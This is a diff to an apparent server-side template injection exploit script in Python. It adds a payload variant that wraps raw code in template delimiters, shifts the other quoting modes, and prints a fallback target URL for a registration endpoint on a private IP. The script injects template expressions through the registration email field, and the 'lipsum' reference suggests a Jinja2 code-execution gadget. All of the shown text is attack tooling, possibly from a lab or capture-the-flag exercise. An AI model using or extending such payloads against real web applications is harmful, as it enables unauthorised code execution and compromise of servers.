@@ -17,9 +17,10 @@ class SSTI():
 	def register(self, code, pw='a'):
 		quoted_code = {
 			0: '{{' + quote_plus(code) + '}}',
-			1: code,
-			2: quote_plus(code),
-			3: '{%' + quote_plus(code) + '%}'
+			1: '{{' + code + '}}',
+			2: code,
+			3: quote_plus(code),
+			4: '{%' + quote_plus(code) + '%}'
 		}
 
 		user = quoted_code[self.status] + '@b.co'
@@ -100,6 +101,7 @@ if __name__ == '__main__':
 				url = f.read()
 		except FileNotFoundError:
 			url = 'http://10.102.0.62/user/register?c=(L=lipsum)'
+			print('No URL found, using: {}'.format(url))
 
 	if args.chars:
 		s = SSTI(url, debug=args.v, status=1)
